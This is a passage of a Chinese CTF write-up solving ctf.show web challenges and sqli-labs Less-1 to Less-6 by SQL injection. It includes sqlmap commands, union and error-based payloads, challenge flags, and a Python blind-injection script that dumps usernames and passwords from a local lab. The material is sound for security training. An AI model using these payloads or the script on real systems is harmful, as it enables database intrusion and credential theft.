sqlmap -u "http://bba43ea3-57af-4af1-a328-5729e65e23ea.challenge.ctf.show/" --data "username=username&password=password" --tamper=space2comment --level=3 -v 3 -D web2 T flag --columns
```

可以在终端中看到以下输出：

```
[DEBUG] performed 33 queries in 16.03 seconds

Database: web2
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+
```

查询指定数据库`web2`中指定表`flag`的指定字段`flag`信息：

```bash
sqlmap -u "http://bba43ea3-57af-4af1-a328-5729e65e23ea.challenge.ctf.show/" --data "username=username&password=password" --tamper=space2comment --level=3 -v 3 -D web2 -T flag -C flag --dump
```

可以在终端中看到以下输出：

```
[PAYLOAD] username'/**/AND/**/(SELECT/**/9580/**/FROM/**/(SELECT(SLEEP(1-(IF(ORD(MID((SELECT/**/IFNULL(CAST(flag/**/AS/**/NCHAR),0x20)/**/FROM/**/web2.flag/**/ORDER/**/BY/**/flag/**/LIMIT/**/0,1),46,1))>1,0,1)))))YVuv)/**/AND/**/'bwOt'='bwOt
[INFO] retrieved: ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb}
[DEBUG] performed 362 queries in 103.68 seconds
[DEBUG] analyzing table dump for possible password hashes
Database: web2
Table: flag
[1 entry]
+-----------------------------------------------+
| flag                                          |
+-----------------------------------------------+
| ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb} |
+-----------------------------------------------+
```

提交`ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb}`即可。

根据`sqlmap`的调试结果，我们可以知道这道题是空格注释`/**/`，手动注入的步骤如下：

```
'/**/or/**/1=1/**/#
```

> 欢迎你，ctfshow

判断列数，得知列数为3。

```
'/**/or/**/1=1/**/group/**/by/**/3#
```

> 欢迎你，ctfshow

判断回显位置，得知回显位置为2

```
'/**/or/**/1=1/**/union/**/select/**/1,/**/2,/**/3#
```

> 欢迎你，ctfshow欢迎你，2

获取数据库名称，得知数据库名为`web2`。

```
'/**/or/**/1=1/**/union/**/select/**/1,/**/database(),/**/3#
```

> 欢迎你，ctfshow欢迎你，web2

根据数据库名`web2`爆破数据表，得到表名`flag`。

```
'/**/or/**/1=1/**/union/**/select/**/1,/**/group_concat(table_name),/**/3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
```

>欢迎你，ctfshow欢迎你，flag,user

根据数据库名`web2`和数据表名`flag`爆破数据列，得到列名`flag`。

```
'/**/or/**/1=1/**/union/**/select/**/1,/**/group_concat(column_name),/**/3/**/from/**/information_schema.columns/**/where/**/table_name='flag'#
```

> 欢迎你，ctfshow欢迎你，flag

根据数据库名`web2`和数据表名`flag`和数据列名`flag`，得到字段信息。

```
'/**/or/**/1=1/**/union/**/select/**/1,/**/flag,/**/3/**/from/**/flag#
```

> 欢迎你，ctfshow欢迎你，ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb}

提交`ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb}`即可。

------

### web7

进入靶机后，看到一个文章列表，点击第一篇文章会请求`/index.php?id=1`，第二篇是`?id=2`，第三篇是`?id=3`。由此可以想到本题考察点是`sql`注入。直接使用`sqlmap`爆破靶机。

查询所有数据库：

```bash
sqlmap -u "https://2eba4e12-aa63-452e-8db2-13936ebc6738.challenge.ctf.show/index.php?id=1" --tamper=space2comment --dbs
```

可以在终端中看到以下输出：

```
[INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.20.1, PHP 7.3.11
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[INFO] fetching database names
available databases [6]:
[*] ctftraining
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] web7
```

查询指定数据库`web7`中的所有表信息：

```bash
sqlmap -u "https://2eba4e12-aa63-452e-8db2-13936ebc6738.challenge.ctf.show/index.php?id=1" --tamper=space2comment -D web7 --tables
```

可以在终端中看到以下输出：

```
[INFO] fetching tables for database: 'web7'
[WARNING] reflective value(s) found and filtering out
Database: web7
[3 tables]
+------+
| page |
| user |
| flag |
+------+
```

查询指定数据库`web7`中指定表`flag`的所有列信息：

```bash
sqlmap -u "https://2eba4e12-aa63-452e-8db2-13936ebc6738.challenge.ctf.show/index.php?id=1" --tamper=space2comment -D web7 -T flag --columns
```

可以在终端中看到以下输出：

```
[INFO] fetching columns for table 'flag' in database 'web7'                       [WARNING] reflective value(s) found and filtering out
Database: web7
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+
```

查询指定数据库`web7`中指定表`flag`的指定字段`flag`信息：

```bash
sqlmap -u "https://2eba4e12-aa63-452e-8db2-13936ebc6738.challenge.ctf.show/index.php?id=1" --tamper=space2comment -D web7 -T flag -C flag --dump
```

可以在终端中看到以下输出：

```
[INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'web7'   [WARNING] reflective value(s) found and filtering out
Database: web7
Table: flag
[1 entry]
+-----------------------------------------------+
| flag                                          |
+-----------------------------------------------+
| ctfshow{3622793f-418f-4603-be59-62fdd8dae124} |
+-----------------------------------------------+
```

提交`ctfshow{3622793f-418f-4603-be59-62fdd8dae124}`即可。

手动注入的步骤如下：

构造永真条件`?id=1/**/and/**/1`发现显示第一篇文章，而`?id=1/**/and/**/0`无文章显示，说明这道题为数值型注入。

先来判断显示位，`id`传参`-1`，因为`id`通常为正数，后端根据`id`查询不到内容就只能展示联合查询的结果，从而判断出字段回显位为2。

```
-1/**/union/**/select/**/1,2,3
```

查询当前数据库名称为`web7`。

```
-1/**/union/**/select/**/1,database(),3
```

查询当前数据库`web7`中的所有数据表信息，得到`flag,page,user`。

```
-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),3
```

根据数据库名`web7`和数据表名`flag`爆破数据列，得到列名`flag`。如果输入`table_name='flag'`字段，会无回显内容，因为`'`被转义为了`%27`，此时我们可以用`'flag'`的HEX值`0x666c6167`绕过。

```
-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=0x666c6167),3
```

根据数据库名`web2`和数据表名`flag`和数据列名`flag`，得到字段信息。

```
-1/**/union/**/select/**/1,(select/**/flag/**/from/**/web7.flag),3
```

提交`ctfshow{3622793f-418f-4603-be59-62fdd8dae124}`即可。

------

## [sqli-labs](https://github.com/Audi-1/sqli-labs)

### Less-1

本题小标题：**GET - Error based - Single quotes - String**。

进入靶机后可以看到信息：

> Please input the ID as parameter with numeric value

1.**判断是否存在SQL注入点**

输入`?id=1`可以看到有两行回显，分别是`Your Login name`和`Your Password`。

输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。

2.**判断闭合字符，注释后面的内容**

输入`?id=1'`可以看到信息：

> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。

输入`?id=1'--+` 或 `?id=1'--%20` 或 `?id=1'%23`都能照常看到两行回显内容，说明这是字符型SQL注入。

3.**使用`order by`排序语句判断有几列数据**

先随便写个数字来猜测有几行数据，输入`?id=1' order by 6%23` 看到以下信息，说明列数是小于6的。

> Unknown column '6' in 'order clause'

再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显内容正常，说明列数为3。

4.**使用`union`联合查询语句判断显示位**

先使`union`前面的内容为假，比如`?id=-1' union`，这样就只会显示`union`后面的内容查询结果。

因为`union`前后查询的字段数量一样，所以后面的`select`需要输入三个字段，输入`?id=-1' union select 1,2,3%23`可以看到回显结果如下，只显示第`2`和第`3`列的数据。

> Your Login name:2
> Your Password:3

5.**爆破数据库名**

使用连接函数`group_concat()`将括号内字段的所有值以逗号作为分隔符连接成一行字符串打印显示。

MySQL自带四个库，其中`information_schema`库下存放着数据库对象相关概要信息，比如字符集、引擎、数据库、数据表、视图、列、权限等，其中有重要的三个表，分别是：

- `schemata`表：存放着MySQL数据库下所有库的信息，show databases命令的结果就是来自于这个表。此表有五列，分别为`catalog_name`、`schema_name`、`default_character_set_name`、`default_collation_name`、`sql_path`，其中`schema_name`列存储的是MySQL数据库下所有库的名字，在爆破数据库名时需要用到`schema_name`，一般是直接**使用`database()`字段查询当前数据库名称**。
- `tables`表：提供关于数据库中表和视图的信息，有两个重要的列，`table_schema`是表所属数据库的名字，`table_name`是表的名字，在爆破表名时需要用到`table_name`。
- `columns`表：提供表中列的信息，详细描述某表中的所有列以及每个列的信息，有三个重要的列，`table_schema`是所属数据库的名字，`table_name`是所属数据表的名字，`column_name`是字段的名字，在爆破字段名时需要用到`column_name`。

输入`?id=-1' union select 1,database(),group_concat(schema_name) from information_schema.schemata%23`查询当前数据库名称并列举所有数据库名，回显信息如下，由此得知当前数据库名为`security`。

> Your Login name:security
> Your Password:ctftraining,information_schema,mysql,performance_schema,security,test

6.**爆破数据表名**

输入`?id=-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='security'%23`查询指定数据库`security`中的表信息。

> Your Login name:security
> Your Password:emails,referers,uagents,users

发现有一个名为`users`的数据表，猜测其中存放着与用户相关的敏感信息。

7.**爆破数据列名**

输入`?id=-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'%23`查询指定数据库`security`中的指定表`users`的所有列信息。

> Your Login name:security
> Your Password:id,username,password

由此可知`username`和`password`是`users`表中的列信息。

8.**爆破数据字段**

输入`?id=-1' union select 1,group_concat(username),group_concat(password) from security.users%23`可以看到所有字段中的数据信息。

> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin
> Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin

知道管理员的用户名和密码后就能登录啦。

------

### Less-2

本题小标题：**GET - Error based Intiger based**。

进入靶机后可以看到信息：

> Please input the ID as parameter with numeric value

1.**判断是否存在SQL注入点**

输入`?id=1`可以看到有两行回显，分别是`Your Login name`和`Your Password`。

输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。

2.**判断闭合字符，注释后面的内容**

输入`?id=1'`可以看到信息：

> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。

输入`?id=1'--+` 或 `?id=1'--%20` 或 `?id=1'%23`显示的结果都依旧是报错信息，说明这不是字符型注入，而是整数型SQL注入。

> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''-- LIMIT 0,1' at line 1

3.**使用`order by`排序语句判断有几列数据**

先随便写个数字来猜测有几行数据，输入`?id=1 order by 6--+` 看到以下信息，说明列数是小于6的。

> Unknown column '6' in 'order clause'

再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显内容正常，说明列数为3。

4.**使用`union`联合查询语句判断显示位**

先使`union`前面的内容为假，比如`?id=-1 union`，这样就只会显示`union`后面的内容查询结果。

因为`union`前后查询的字段数量一样，所以后面的`select`需要输入三个字段，输入`?id=-1 union select 1,2,3--+`可以看到回显结果如下，只显示第`2`和第`3`列的数据。

> Your Login name:2
> Your Password:3

5.**爆破数据库**

查询所有数据库：

```sql
?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata--+
```

> Your Login name:2
> Your Password:ctftraining,information_schema,mysql,performance_schema,security,test

查询当前数据库：

```sql
?id=-1 union select 1,2,database()--+
```

> Your Login name:2
> Your Password:security

查询指定数据库中的数据表信息：

```sql
?id=-1 union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='security'--+
```

> Your Login name:security
> Your Password:emails,referers,uagents,users

查询指定数据表中的数据列信息：

```sql
?id=-1 union select 1,database(), group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+
```

> Your Login name:security
> Your Password:id,username,password

查询指定数据表中的数据字段信息：

```sql
?id=-1 union select 1,group_concat(username),group_concat(password) from security.users--+
```

> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin
> Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin

------

### Less-3

本题小标题：**GET - Error based - Single quotes with twist - String**。

进入靶机后可以看到信息：

> Please input the ID as parameter with numeric value

1.**判断是否存在SQL注入点**

输入`?id=1`可以看到有两行回显，分别是`Your Login name`和`Your Password`。

输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。

2.**判断闭合字符，注释后面的内容**

输入`?id=1'`可以看到信息，说明闭合方式存在问题，正确的闭合字符是`') ` 。

> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1

`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能正常显示回显。

输入`?id=1')--+` 或 `?id=1')--%20` 或 `?id=1')%23`可以看到正常回显，说明这是字符型SQL注入，且闭合字符为`')`。

3.**使用`order by`排序语句判断有几列数据**

先随便写个数字来猜测有几行数据，输入`?id=1') order by 6--+`看到以下信息，说明列数是小于6的。

> Unknown column '6' in 'order clause'

再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显内容正常，说明列数为3。

4.**使用`union`联合查询语句判断显示位**

先使`union`前面的内容为假，比如`?id=-1') union`，这样就只会显示`union`后面的内容查询结果。

因为`union`前后查询的字段数量一样，所以后面的`select`需要输入三个字段，输入`?id=-1') union select 1,2,3--+`可以看到回显结果如下，只显示第`2`和第`3`列的数据。

> Your Login name:2
> Your Password:3

5.**爆破数据库**

查询所有数据库：

```sql
?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata--+
```

> Your Login name:2
> Your Password:challenges,ctftraining,information_schema,mysql,performance_schema,security,test

查询当前数据库：

```sql
?id=-1') union select 1,2,database()--+
```

> Your Login name:2
> Your Password:security

查询指定数据库中的数据表信息：

```sql
?id=-1') union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='security'--+
```

> Your Login name:security
> Your Password:emails,referers,uagents,users

查询指定数据表中的数据列信息：

```sql
?id=-1') union select 1,database(), group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+
```

> Your Login name:security
> Your Password:id,username,password

查询指定数据表中的数据字段信息：

```sql
?id=-1') union select 1,group_concat(username),group_concat(password) from security.users--+
```

> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
> Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4

------

### Less-4

本题小标题：**GET - Error based - Double quotes - String**。

进入靶机后可以看到信息：

> Please input the ID as parameter with numeric value

1.**判断是否存在SQL注入点**

输入`?id=1`可以看到有两行回显，分别是`Your Login name`和`Your Password`。

输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。

2.**判断闭合字符，注释后面的内容**

输入`?id=1'`居然可以看到正常回显，输入`?id=1' order by 5--+`也能看到，这就说明不对劲啦。

> Your Login name:Dumb
> Your Password:Dumb

根据小标题提示信息，输入`?id=1"`可以看到信息，说明存在闭合问题，正确的闭合字符是`")`。

> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1

输入`?id=1")--+` 或 `?id=1")--%20` 或 `?id=1")%23`可以看到正常回显，说明这是字符型SQL注入，且闭合字符为`")`。

3.**使用`order by`排序语句判断有几列数据**

先随便写个数字来猜测有几行数据，输入`?id=1") order by 6--+`看到以下信息，说明列数是小于6的。

> Unknown column '6' in 'order clause'

再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显内容正常，说明列数为3。

4.**使用`union`联合查询语句判断显示位**

先使`union`前面的内容为假，比如`?id=-1") union`，这样就只会显示`union`后面的内容查询结果。

因为`union`前后查询的字段数量一样，所以后面的`select`需要输入三个字段，输入`?id=-1") union select 1,2,3--+`可以看到回显结果如下，只显示第`2`和第`3`列的数据。

> Your Login name:2
> Your Password:3

5.**爆破数据库**

查询所有数据库：

```sql
?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata--+
```

> Your Login name:2
> Your Password:challenges,ctftraining,information_schema,mysql,performance_schema,security,test

查询当前数据库：

```sql
?id=-1") union select 1,2,database()--+
```

> Your Login name:2
> Your Password:security

查询指定数据库中的数据表信息：

```sql
?id=-1") union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

> Your Login name:security
> Your Password:emails,referers,uagents,users

查询指定数据表中的数据列信息：

```sql
?id=-1") union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
```

> Your Login name:security
> Your Password:id,username,password

查询指定数据表中的数据字段信息：

```sql
?id=-1") union select 1,group_concat(username),group_concat(password) from security.users--+
```

> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
> Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4

------

### Less-5

本题小标题：**GET - Double lnjection - Single quotes - String**。

进入靶机后可以看到信息：

> Please input the ID as parameter with numeric value

1.**判断是否存在SQL注入点**

输入`?id=1`可以看到信息：

> You are in...........

输入`?id=1 and 1=1`依旧可以看到一样的回显，我们通过布尔条件测试说明存在注入点。

2.**判断闭合字符，注释后面的内容**

输入`?id=1'`可以看到信息：

> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。

输入`?id=1'--+` 或 `?id=1'--%20` 或 `?id=1'%23`都能照常看到You are in...........，推测这是字符型SQL注入。

3.**使用`order by`排序语句判断有几列数据**

先随便写个数字来猜测有几行数据，输入`?id=1' order by 6--+`看到以下信息，说明列数是小于6的。

> Unknown column '6' in 'order clause'

再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显是You are in...........，说明列数为3。

4.**使用`union`联合查询语句判断显示位**

先使`union`前面的内容为假，比如`?id=-1' union`，这样就只会显示`union`后面的内容查询结果。输入`?id=-1' union select 1,2,3--+`可以看到回显结果是You are in...........。

由于我们在判断数据有几列的过程中看见了报错信息，因此可以尝试SQL报错注入。

5.**SQL报错注入**

某些网站为了方便开发者调试会开启调试信息，只要此时触发SQL语句的错误就能在页面上看到SQL语句执行后的报错信息，这种攻击方式被称为报错注入。

`updatexml()`在执行时，第二个参数应该是合法的XPATH路径，否则将会在引发报错的同时将传入的参数进行输出。例如可以利用`database()`回显当前连接的数据库。

```sql
?id=1' and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
```

> XPATH syntax error: '~security~'

知道数据库名是`security`后，继续利用报错注入得到数据表名。

```sql
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
```

> XPATH syntax error: '~emails,referers,uagents,users~'

继续爆破得到数据列名信息。

```sql
?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)--+
```

> XPATH syntax error: '~id,username,password~'

最后爆破指定数据字段信息，可以看到显示并不完全。

```sql
?id=1' and updatexml(1,concat(0x7e,(select group_concat(username) from security.users),0x7e),1)--+
```

> XPATH syntax error: '~Dumb,Angelina,Dummy,secure,stup'

利用`Python`脚本来获取数据。

```python
# -*- coding:utf-8 -*-
import requests
import typing

def ascii_str():  # 生成库名表名字符所在的字符列表字典
    str_list = []
    for i in range(33, 127):  # 所有可显示字符
        str_list.append(chr(i))
    # print('可显示字符：%s'%str_list)
    return str_list  # 返回字符列表


def db_length(url, str):
    print("[-]开始测试数据库名长度.......")
    num = 1
    while True:
        db_payload = url + "' and (length(database())=%d)--+" % num
        r = requests.get(db_payload)
        if str in r.text:
            db_length = num
            print("[+]数据库长度：%d\n" % db_length)
            db_name(db_length)  # 进行下一步，测试库名
            break
        else:
            num += 1


def db_name(db_length):
    print("[-]开始测试数据库名.......")
    db_name = ''
    str_list = ascii_str()
    for i in range(1, db_length + 1):
        for j in str_list:
            db_payload = url + "' and (ord(mid(database(),%d,1))='%s')--+" % (i, ord(j))
            r = requests.get(db_payload)
            if str in r.text:
                db_name += j
                break
    print("[+]数据库名：%s\n" % db_name)
    tb_piece(db_name)  # 进行下一步，测试security数据库有几张表
    return db_name


def tb_piece(db_name):
    print("开始测试%s数据库有几张表........" % db_name)
    for i in range(100):  # 猜解库中有多少张表，合理范围即可
        tb_payload = url + "' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+" % (i, db_name)
        r = requests.get(tb_payload)
        if str in r.text:
            tb_piece = i
            break
    print("[+]%s库一共有%d张表\n" % (db_name, tb_piece))
    tb_name(db_name, tb_piece)  # 进行下一步，猜解表名


def tb_name(db_name, tb_piece):
    print("[-]开始猜解表名.......")
    table_list = []
    for i in range(tb_piece):
        str_list = ascii_str()
        tb_length = 0
        tb_name = ''
        for j in range(1, 20):  # 表名长度，合理范围即可
            tb_payload = url + "' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+" % (i, j)
            r = requests.get(tb_payload)
            if str in r.text:
                tb_length = j
                print("第%d张表名长度：%s" % (i + 1, tb_length))
                for k in range(1, tb_length + 1):  # 根据表名长度进行截取对比
                    for l in str_list:
                        tb_payload = url + "' and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+" % (i, k, ord(l))
                        r = requests.get(tb_payload)
                        if str in r.text:
                            tb_name += l
                print("[+]：%s" % tb_name)
                table_list.append(tb_name)
                break
    print("\n[+]%s库下的%s张表：%s\n" % (db_name, tb_piece, table_list))
    column_num(table_list, db_name)  # 进行下一步，猜解每张表的字段数


def column_num(table_list, db_name):
    print("[-]开始猜解每张表的字段数：.......")
    column_num_list = []
    for i in table_list:
        for j in range(30):  # 每张表的字段数量，合理范围即可
            column_payload = url + "' and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+" % (j, i)
            r = requests.get(column_payload)
            if str in r.text:
                column_num = j
                column_num_list.append(column_num)  # 把所有表的字段，依次放入这个列表当中
                print("[+]%s表\t%s个字段" % (i, column_num))
                break
    print("\n[+]表对应的字段数：%s\n" % column_num_list)
    column_name(table_list, column_num_list, db_name)  # 进行下一步，猜解每张表的字段名


def column_name(table_list, column_num_list, db_name):
    global data_num
    data_num = 0
    print("[-]开始猜解每张表的字段名.......")
    column_length = []
    str_list = ascii_str()
    column_name_list = []
    for t in range(len(table_list)):  # t在这里代表每张表的列表索引位置
        print("\n[+]%s表的字段：" % table_list[t])
        for i in range(column_num_list[t]):  # i表示每张表的字段数量
            column_name = ''
            for j in range(1, 21):  # j表示每个字段的长度
                column_name_length = url + "' and %d=(select length(column_name) from information_schema.columns where table_name='%s' limit %d,1)--+" % (j - 1, table_list[t], i)
                r = requests.get(column_name_length)
                if str in r.text:
                    column_length.append(j)
                    break
                for k in str_list:  # k表示我们猜解的字符字典
                    column_payload = url + "' and ord(mid((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1))=%d--+" % (table_list[t], i, j, ord(k))
                    r = requests.get(column_payload)
                    if str in r.text:
                        column_name += k
            print('[+]：%s' % column_name)
            column_name_list.append(column_name)
    # print(column_name_list)#输出所有表中的字段名到一个列表中
    dump_data(table_list, column_name_list, db_name)  # 进行最后一步，输出指定字段的数据
def dump_data(table_list, column_name_list, db_name):
    global data_num
    data_num = 0
    from typing import List
    print("\n[-]对%s表的%s字段进行爆破.......\n" % (table_list[3], column_name_list[12:16]))
    str_list = ascii_str()
    for i in column_name_list[12:16]:  # id,username,password字段
        for j in range(101):  # j表示有多少条数据，合理范围即可
            data_num_payload = url + "' and (select count(%s) from %s.%s)=%d--+" % (i, db_name, table_list[3], j)
            r = requests.get(data_num_payload)
            if str in r.text:
                data_num = j
                break
        print("\n[+]%s表中的%s字段有以下%s条数据：" % (table_list[3], i, data_num))
        for k in range(data_num):
            data_len = 0
            dump_data = ''
            for l in range(1, 21):  # l表示每条数据的长度，合理范围即可
                data_len_payload = url + "' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+" % (i, db_name, table_list[3], k, l)
                r = requests.get(data_len_payload)
                if str not in r.text:
                    data_len = l - 1
                    for x in range(1, data_len + 1):  # x表示每条数据的实际范围，作为mid截取的范围
                        for y in str_list:
                            data_payload = url + "' and ord(mid((select %s from %s.%s limit %d,1),%d,1))=%d--+" % (i, db_name, table_list[3], k, x, ord(y))
                            r = requests.get(data_payload)
                            if str in r.text:
                                dump_data += y
                                break
                    break
            print('[+]%s' % dump_data)  # 输出每条数据


if __name__ == '__main__':
    url = "http://127.0.0.1/sqli-labs-master/Less-5/?id=1"  # 目标url
    str = "You are in"  # 布尔型盲注的true&false的判断因素
    db_length(url, str)  # 程序入口
```

此外，还可以使用`sqlmap`进行爆破求解。

查询所有数据库：

```bash
sqlmap -u "http://127.0.0.1/Less-5/?id=1" --dbs
```

可以在终端中看到以下输出：

```
available databases [7]:
[*] challenges
[*] ctftraining
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
[*] test
```

查询当前数据库：

```bash
sqlmap -u "http://127.0.0.1/Less-5/?id=1" --current-db
```

可以在终端中看到以下输出：

```
[INFO] fetching current database
current database: 'security'
```

查询指定数据库中的所有表信息：

```bash
sqlmap -u "http://127.0.0.1/Less-5/?id=1" -D security --tables
```

可以在终端中看到以下输出：

```
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+
```

查询指定数据库中指定表的所有列信息：

```bash
sqlmap -u "http://127.0.0.1/Less-5/?id=1" -D security -T users --columns
```

可以在终端中看到以下输出：

```
Database: security
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+
```

查询指定数据库中指定表的指定字段信息：

```bash
sqlmap -u "http://127.0.0.1/Less-5/?id=1" -D security -T users -C "username,password" --dump
```

可以在终端中看到以下输出：

```
Database: security
Table: users
[13 entries]
+----------+------------+
| username | password   |
+----------+------------+
| admin    | admin      |
| admin1   | admin1     |
| admin2   | admin2     |
| admin3   | admin3     |
| admin4   | admin4     |
| secure   | crappy     |
| Dumb     | Dumb       |
| dhakkan  | dumbo      |
| superman | genious    |
| Angelina | I-kill-you |
| batman   | mob!le     |
| Dummy    | p@ssword   |
| stupid   | stupidity  |
+----------+------------+
```

显然，用`sqlmap`爆破求解会更加方便，但是平时练习的时候还是手动注入吧。

”**青铜刀锋，不轻易用，苍生为重。**“

------

### Less-6

本题小标题：**GET - Double lnjection - Double quotes - String**。

进入靶机后可以看到信息：

> Please input the ID as parameter with numeric value

1.**判断是否存在SQL注入点**

输入`?id=1`可以看到信息：

> You are in...........

输入`?id=1 and 1=1`依旧可以看到一样的回显，我们通过布尔条件测试说明存在注入点。

2.**判断闭合字符，注释后面的内容**

输入`?id=1'`依旧可以看到信息：

> You are in...........

输入`?id=1"`回显如下：

> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '"1"" LIMIT 0,1' at line 1

`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。

输入`?id=1"--+`回显如下：

> You are in...........

这说明该注入点的闭合字符是`"`。

3.**使用`order by`排序语句判断有几列数据**

先随便写个数字来猜测有几行数据，输入`?id=1' order by 6--+`看到以下信息，说明列数是小于6的。

> Unknown column '6' in 'order clause'

再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而输入`?id=1" order by 3--+`时，回显是You are in...........，说明列数为3，即数据有`3`列。

4.**使用`union`联合查询语句判断显示位**

先使`union`前面的内容为假，比如`?id=-1" union`，这样就只会显示`union`后面的内容查询结果。输入`?id=-1" union select 1,2,3--+`可以看到回显结果是You are in...........。

由于我们在判断数据有几列的过程中看见了报错信息，因此可以尝试SQL报错注入。

5.**爆破数据库名**

`updatexml()`在执行时，第二个参数应该是合法的XPATH路径，否则将会在引发报错的同时将传入的参数进行输出。例如可以利用`database()`回显当前连接的数据库。

```sql
?id=1" and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
```

> XPATH syntax error: '~security~'

知道数据库名是`security`后，继续利用报错注入得到数据表名。

```sql
?id=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
```

> XPATH syntax error: '~emails,referers,uagents,users~'

继续爆破得到数据列名信息。

```sql
?id=1" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)--+
```

> XPATH syntax error: '~id,username,password~'

最后爆破指定数据字段信息，可以看到显示并不完全。

```sql
?id=1" and updatexml(1,concat(0x7e,(select group_concat(username) from security.users),0x7e),1)--+
```

> XPATH syntax error: '~Dumb,Angelina,Dummy,secure,stup'

还是那句话，用`sqlmap`爆破求解会更加方便，但是平时练习的时候还是手动注入吧。

”**青铜刀锋，不轻易用，苍生为重。**“

------

### Less-7

本题小标题：**GET -Dump into outfile - String**。

